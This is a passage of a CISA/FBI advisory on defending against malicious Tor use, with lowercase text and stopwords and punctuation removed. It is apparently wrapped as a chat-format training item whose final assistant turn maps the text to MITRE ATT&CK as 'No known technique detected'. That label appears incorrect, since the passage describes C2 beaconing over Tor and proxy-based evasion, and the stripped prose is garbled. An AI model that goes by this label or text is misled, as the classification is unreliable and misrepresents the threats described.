monitoring foreign governments users may use tor visiting electionsrelated websites check voter registration status mark cast absentee ballots via email web portal similarly users may use tor avoid tracking advertisers browsing internet organizations wish block legitimate traffic tofrom tor entryexit nodes consider adopting practices allow network monitoring traffic analysis traffic nodes consider appropriate blocking approach resource intensive allow greater flexibility adaptation defensive blended approach block tor traffic resources allow monitor others given various licit illicit uses tor blended approach may appropriate risk mitigation strategy organizations ie intentionally allowing traffic tofrom tor specific websites services legitimate use may expected blocking tor traffic tofrom nonexcepted processesservices may require continuous reevaluation entity considers risk tolerance associated different applications level effort implement approach high considerations blocking use tor sophisticated threat actors may leverage additional anonymization technologiessuch virtual private networks vpnsand configurable features within torsuch tor bridges pluggable transportsto circumvent detection blocking blocking use known tor nodes may effectively mitigate hazards may protect less sophisticated actors example blocking outbound traffic known tor entry nodes could appreciable impact blocking less sophisticated malware successfully beaconing hidden c2 machines obfuscated tor ultimately entity must consider internal thresholds risk tolerance determining risk mitigation approach associated tor contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov disclaimer document marked tlpwhite disclosure limited sources may use tlpwhite information carries minimal foreseeable risk misuse accordance applicable rules procedures public release subject standard copyright rules tlpwhite information may distributed without restriction information traffic light protocol see httpwwwuscertgovtlp references1 cisa alert continued threat actor exploitation post pulse secure vpn patching april 2020 cyber threat actors used connection proxiessuch tor vpsto minimize chance detection connecting victim vpn appliances2 cisa analysis report enhanced analysis grizzly steppe activity february 2017 grizzly steppe actors infected pirated software torrent services leveraged tor exit nodes deliver malware since least 20143 fbi press release 400 onion addresses including dozens dark market sites targeted part global enforcement action tor network november 2014 advertised goods services included computerhacking tools services revisions july 1 2020 initial versionmay 20 2021 corrected link table 2august 2 2021 corrected link pdf product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
